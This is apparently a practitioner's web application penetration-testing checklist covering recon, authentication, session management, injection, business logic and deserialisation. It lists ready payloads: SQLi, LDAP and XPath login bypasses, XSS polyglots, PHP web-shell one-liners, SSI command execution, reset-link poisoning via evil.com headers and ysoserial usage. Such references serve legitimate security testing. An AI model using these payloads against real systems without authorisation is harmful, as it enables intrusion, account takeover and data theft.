
This is a collection of checklists and cheat-sheet style data for web application penetration tests. Everything I know about web app testing will eventually land here. It includes sections on:

```
-   Information gathering and leakage checks
-   Authentication controls
-   Authorisation controls
-   Session Management
-   Data validation and injection
-   Data storage and encryption
-   Transport security
-   Business logic
-   Client-side testing
```

## Information gathering and leakage checks
- [ ] HTTP Headers: [https://securityheaders.com/](https://securityheaders.com/)
- [ ] Cookie Flags?
- [ ] Burp scan
	- [ ] Burp private collaborator: `c.scloud.sh` (TLS certificate errors might)
- [ ] `python3 /opt/log4j-scan/log4j-scan.py -l targets.txt --run-all-tests --waf-bypass`
- [ ] Google dorking:
	- `site:`
- End of life software: [https://endoflife.date/android](https://endoflife.date/android)
- [ ] Known files:
	- `robots.txt`
	- `crossdomain.xml`
	- `clientaccesspolicy.xml`
	- `sitemap.xml`
	- `/.well-known/`
- [ ] HTTP headers
	- `curl -I hostname`
	- `whatweb url`
		- `webanalyze -host url -crawl 1`
- [ ] run `whatweb`
	- check exploitdb
	- check CVEs
- [ ] run nuclei
	- `nuke url`
- [ ] Check old URLS
	- [gau](https://github.com/lc/gau)  
	- [waybackurls](https://github.com/tomnomnom/waybackurls)
	- [hakrawler](https://github.com/hakluke/hakrawler)
- [ ] Check potential vulnerable urls ([gf-patterns](https://github.com/1ndianl33t/Gf-Patterns))
- [ ] Check JS files for API keys
	- [SecretFinder](https://github.com/m4ll0k/SecretFinder)
		- `secretfinder url`
	- Then check on [keyhacks](https://github.com/streaak/keyhacks)
- [ ] Check shodan
	- `port:"9200" elastic`
	- `product:"docker"`
	- `product:"kubernetes"`
	- `hostname:"target.com"`
	- `host:"10.10.10.10"`
	- `org:YOUR TAGET http.favicon.hash:116323821`
- [ ] default credentials
- [ ] email addresses disclosed
- [ ] check emails on haveibeenpwnd
- [ ] directory/file enumeration
	- `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -u $1FUZZ -e .php, .aspx, .html`
- [ ] default web server configuration files
- [ ] exposed admin panels
- [ ] information disclosure
	- errors
	- API
	- default config files
- [ ] HTML comments
- [ ] Identify  WAF
	- `whatwaf -u url`
- [ ] Check fake HTTP Verb like `FAKE` to get error responses
- [ ] Check [Hunter.io](https://hunter.io/) for company email format
- [ ] Look up CMS on [Hacktricks](https://book.hacktricks.xyz/)
	- Weblogic: https://www.errno.fr/WebLogic.html
	- Wordpress: WPScan
	- Joomla; Joomscan
	- Apache version 2.4.29 RCE?
			- https://www.exploit-db.com/exploits/50383

--- 

## Authentication controls

### Login basics
- [ ] Login request has HTTPS enforced
- [ ] Rate limiting
- [ ] User account lockout mechanism on brute force attack
- [ ] User enumeration
	- Response size
	- Response code
	- Response timing
	- Error code
- [ ] Change HTTP method
- [ ] Check GET Method for authentication
	- should be POST only
- [ ] CSRF tokens
- [ ] 2FA
	- email considered weak
	- SMS considered weak
	- bruteforce OTP
	- does same OTP work multiple times
- [ ] Password policy weaknesses
	- allows 1 character password
	- allows one word passwords
	- allows short under 8 char passwords
	- blank passwords
	
### Login bypass
- [ ] SQL injection bypass
	- [ ] check username field
	- [ ] check password field
	- `'or 1=1-- -'`
	- `'or 1=1--`
	- `"or 1=1-- -`
	- `"or 1=1--`
	- `'or 1#`
	- `"or 1#`
	- Resources:
		- [kreep blog: SQL injection Fundamentals](https://kreep.in/web-fundamentals-sql-injection/index.html)
		- [Portswigger Academy SQL injection](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [ ] LDAP injection bypass
	- `*`
	- `\*)(&`
	- `\*)(|(&` and password: `pwd)`
	- `\*)(|(password\=\*` and password: `test)`
	- `\*))%00` and password: `any`
	- `admin)(&)` and password `pwd`
	- `admin)(!(&(|` and password `any))`
	- `*` and password: `\*)(&`
	- `admin))(|(|` and password: `any`
	- Resources:
		- [Hacktricks: LDAP Injection](https://book.hacktricks.xyz/pentesting-web/ldap-injection)
	- [ ] XPATH injection: for XML documents with auth
	- `' or '1'='1`
	- `' or ''='`
	- `' or 1\]%00`
	- `' or /\* or '`
	- `' or "a" or '`
	- `' or 1 or '`
	- `' or true() or '`
	- `admin' or '`
	- `admin' or '1'='2`
	- Resources:
		- [Hacktricks: XPATH injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection)
- [ ] Buffer overflow
	- 200+ chars username
	- 200+ chars password
	- 200+ chars both at same time

### Registration
- [ ] register with existing username/email
- [ ] email registration checks
<table>
  <thead>
    <tr>
      <th style="text-align:left">Attack</th>
      <th style="text-align:left">Payload</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">XSS</td>
      <td style="text-align:left">
        <p>test+(alert(0))@example.com</p>
        <p>test@example(alert(0)).com</p>
        <p>&quot;alert(0)&quot;@example.com</p>
        <p>&lt;script src=//xsshere?&#x201D;@email.com</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Template injection</td>
      <td style="text-align:left">
        <p>&quot;&lt;%= 7 \* 7 %&gt;&quot;@example.com</p>
        <p>test+(${{7\*7}})@example.com</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">SQLi</td>
      <td style="text-align:left">
        <p>&quot;&apos; OR 1=1 -- &apos;&quot;@example.com</p>
        <p>&quot;mail&apos;); SELECT version();--&quot;@example.com</p>
        <p>a&apos;-IF(LENGTH(database())=9,SLEEP(7),0)or&apos;1&apos;=&apos;1\\&quot;@a.com</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">SSRF</td>
      <td style="text-align:left">
        <p>john.doe@abc123.burpcollaborator.net</p>
        <p>john.doe@\[127.0.0.1\]</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Parameter Pollution</td>
      <td style="text-align:left">victim&amp;email=attacker@example.com</td>
    </tr>
    <tr>
      <td style="text-align:left">(Email) Header Injection</td>
      <td style="text-align:left">
        <p>&quot;%0d%0aContent-Length:%200%0d%0a%0d%0a&quot;@example.com</p>
        <p>&quot;recipient@test.com&gt;\\r\\nRCPT TO:&lt;victim+&quot;@test.com</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Wildcard abuse</td>
      <td style="text-align:left">%@example.com</td>
    </tr>
  </tbody>
</table>
- [ ] allows disposable emails for registration
	- yopmail.com
- [ ] password with spaces only
- [ ] long password over 200 chars cause DoS
- [ ] Corrupt authentication and session defects: Sign up, don't verify, request change password, change, check if account is active.
- [ ] Try to re-register repeating same request with same password and different password too
	- are both passwords valid ?
	- which password works
	- account activated without verifying ? 
- [ ] 2 instances open, 1st change or reset password, refresh 2nd instance
- [ ] Lack of confirmation -> try to register with company email.
- [ ] Lack of password confirmation on change email, password or 2FA

### Forgot/Reset password

- [ ] Uniqueness of forget password reset link/code
- [ ] password sent in plaintext to email
- [ ] Find user id or other sensitive fields in reset link and tamper them
- [ ] Request 2 reset passwords links and use the older
- [ ] Check if many requests have sequential tokens
- [ ] Use username@burp_collab.net and analyze the callback
- [ ] Add `X-Forwarded-Host: evil.com` to receive the reset link with evil.com
	-  `X-Forwarded-For: evil.com`
	-  `X-Host: evil.com`
- [ ] IDOR in reset link
- [ ] Capture reset token and use with other email/userID
- [ ] Check encryption in reset password token
	- can decode ?
- [ ] Append second email param and value
	- which receives ?
---

## Profile/Account details
- [ ] IDOR for other users' details
- [ ] CSRF on any account detail change
- [ ] change email with an existing one to see if validation in place
- [ ] CSV injection on export/import
- [ ] EXIF data of downloadable files
	- check url of image for other users'
	- check `exiftool` for shared documents
- [ ] SSRF on URL for profile pic
	- burp collaborator
	- VPS with alias `attackbox`
	- schemas: [SSRF Schemas](https://highon.coffee/blog/ssrf-cheat-sheet/)
		- ```
		gopher://
		fd:// 
		expect://
		ogg://
		tftp://
		dict://
		ftp://
		ssh2://
		file://
		http://
		https://
		imap://
		pop3://
		mailto://
		smtp://
		telnet://
- [ ] Imagetragick on image uploads
	- [Imagetragick Exploitation](https://resources.infosecinstitute.com/topic/exploiting-imagetragick/)
- [ ] bruteforce enumeration when change any user unique parameter.
	- [!] Be careful not to affect real users during a pentest
- [ ] parameter pollution to add two values of same field
	- which field is accepted
	- errors with sensitive information

## Authorization controls
- [ ] IDOR to objects belonging to current user
- [ ] changing user ID on requests
- [ ] Parameter pollution with user ID
- [ ] remove cookies when accessing locations requiring auth
- [ ] privilege escalation
- [ ] With privileged user perform privileged actions, try to repeat with unprivileged user cookie.
- [ ] Run `/opt/403bypass/bypass_403.sh url` to check for 403 bypasses

---

## Session Management
- [ ] Concurrent logon sessions permitted
- [ ] CSRF token
	- tampering
	- missing ?
	- predictable ?
	- change request method
	- ![CSRF attacks](https://camo.githubusercontent.com/1216587b905ccfe5114a4420caad3369e49d57c12d9c837a78330733540f9a12/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f4559373062786b576b4141467a47623f666f726d61743d6a7067266e616d653d39303078393030)
- [ ] CSRF PoC
- [ ] Sessions timeout in place
- [ ] Session token still valid after logout
- [ ] Check HTTPOnly and Secure flags
- [ ] Sensitive information in session tokens
- [ ] JWT token present
	- [JWT attacks](https://pentestbook.six2dez.com/enumeration/webservices/jwt)
	- https://token.dev/ might derive private key that works

---
## Headers

- [ ]  X-XSS-Protection
- [ ]  Strict-Transport-Security
- [ ]  Content-Security-Policy
- [ ]  Public-Key-Pins
- [ ]  X-Frame-Options
- [ ]  X-Content-Type-Options
- [ ]  Referer-Policy
- [ ]  Cache-Control
- [ ]  Expires
---

## Data validation and injection
- [ ] Allows malicious file upload
	- EICAR test string: `X5O!P%@AP\[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\*`
	- [Upload Insecure Files: PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
	- [ExploitDB File Upload Bypasses](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
- [ ] Open redirects
- [ ] HTML injection
- [ ] XSS
	- polyglots:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e


start`'>">');");'};"};']"]\kreep\\<script>alert("${{7*7}}")</script>["['{"{'("('<"<'
```
- [ ] SQL injection
- [ ]  NoSQL injection
	- `' || 'a'=='a`
	- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [ ] SSTI
- [ ] SSRF
- [ ] LFI/RFI
	- Linux: `/etc/passwd`
	- Wind: `C:\\boot.ini` or `C:/windows/system32/drivers/etc/hosts`
	- `<?php echo shell_exec($_GET['cmd']);?>`
	- `<?php passthru($_GET['cmd'] . ' 2>&1'); ?>` 
		- Redirects stderr to stdout
	- `expect://command`
	- Resources:
		- [Pentestbook: LFI + RFI](https://pentestbook.six2dez.com/enumeration/web/lfi-rfi)
- [ ] SSI (Server Side Includes)
	- `<!--#echo var="REMOTE_ADDR" -->`
	- ``<!--#exec cmd="whoami" -->``
- [ ] XXE (XML) injection
- [ ] LDAP injection
- [ ] OS command injection#
- [ ] Overflows
	- [ ] long input
	- [ ] format string inputs
		- `%x.%x.%x`
- [ ] SMTP injection (need to learn this)
- [ ] SOAP injection (need to learn this)
- [ ] Fuzz parameters with FuzzDB wordlists + Burp Intruder
	- wordlists at `/opt/fuzzdb`
---

## Data storage and encryption
- [ ] check hashing algorithm of password hashes/cookies/parameters
	- `hashid hash`
	- suggest Argon2/Scrypt, last resort: Bcrypt

---

## Transport security
- [ ] HTTP headers
	- `headrush url -s`
- [ ] HTTP methods PUT/DELETE/TRACE/OPTIONS allowed
- [ ] HTTPS enforced
	- redirection from HTTP -> HTTPS enforeced ?
- [ ] SSL/TLS check
	- `testssl.sh url`

---

## Business logic
- [ ] Client side input validation bypasses through Burp
- [ ] Implemented CAPTCHA in email forms to avoid flooding
- [ ] Tamper product id, price or quantity value in any action (add, modify, delete, place, pay...)
- [ ] Tamper gift or discount codes
	- Bruteforce
	- injection attacks
- [ ] Reuse old giftcodes
- [ ] Parameter pollution to use giftcode twice in same request
- [ ] XSS in address field as it is usually not limited 
- [ ] cleartext CVV / Card number
- [ ] IDOR affecting other users
- [ ] test Credit cards:
	- Ask client for them
```
CC: 4111 1111 1111 1111
Expiration Date: 03/2030
CVV2 / CVC3: 737
```
- [ ] Check PRINT or PDF creation for IDOR
	- try XXE/XSS/HTML injection in fields that are sent to PDF generation
- [ ] Check unsubscribe button with user enumeration
- [ ] Change POST sensitive requests to GET
- [ ] Parameter pollution on social media sharing links
---

## Client-side testing
- [ ] Browser Storage
- [ ] Cross Site Script Includes
- [ ] DOM XSS
	- [XSStrike](https://github.com/s0md3v/XSStrike)
	- `python3 xsstrike.py -u url`
- [ ] HTML Injection
- [ ] Client-side URL redirect
- [ ] CSS Injection
- [ ] Client-side resource manipulation
- [ ] Cross Origin Resource Sharing
- [ ] WebSockets
- [ ] Web messaging

--- 

## CAPTCHA
-  [ ] Send old captcha value.
-  [ ] Send old captcha value with old session ID.
-  [ ] Request captcha absolute path like www.url.com/captcha/1.png
-  [ ] Remove captcha with any adblocker and request again
-  [ ] Bypass with OCR tool ([easy one](https://github.com/pry0cc/prys-hacks/blob/master/image-to-text))
-  [ ] Change from POST to GET or PUT
-  [ ] Remove captcha parameter
-  [ ] Convert JSON request to normal
-  [ ] Try header injections

## GraphQL

-  [ ] https://blog.assetnote.io/2021/08/29/exploiting-graphql/

## Deserialisation

If whitebox testing, grep through source code for whitebox functions of whatever application language you're dealing with. In Ruby and .Net remember deserialisation is sinonymous to "Marshalling". In Python it's called "pickling". 

You can often get RCE/DoS/privilege escalation depending on where the vulnerability is found. Look at places like session cookies, headers, form data, upload data etc... for serialised data that could be modified in some way.

Functions and patterns to look for when testing for deserialisation:

- PHP
	- unserialize()
- Python
	- pickle/c_pickle/ pickle with load/loads
	- PyYAML with load
	- jsonpickle with encode or store methods>/tmp/f

- Java
	- XMLdecoder with external user defined parameters
	- XStream with fromXML method (xstream version <= v1.46 is vulnerable to the serialization issue)
	- ObjectInputStream with readObject
	- Uses of readObject, readObjectNodData, readResolve or readExternal
	- ObjectInputStream.readUnshared
	- Serializable
- Java (Blackbox)
	- AC ED 00 05 in Hex
	- rO0 in Base64
	- Content-type: application/x-java-serialized-object
	- java -jar ysoserial.jar CommonsCollections4 'command'
	
- .Net
	- TypeNameHandling
	- JavaScriptTypeResolver 
- .Net (Blackbox)
	- AAEAAAD/////
	- TypeObject
	- $type

	
# References
- https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Web_Application_Penetration_Checklist_v1_1.pdf
- https://devcount.com/web-pentesting-checklist/
- https://pentestbook.six2dez.com/
- https://github.com/harshinsecurity/web-pentesting-checklist

1. Understanding how the app work and technologies
2. Testing injections
3. Testing access controls
4. Active scans & testing rabbit holes
5. reporting 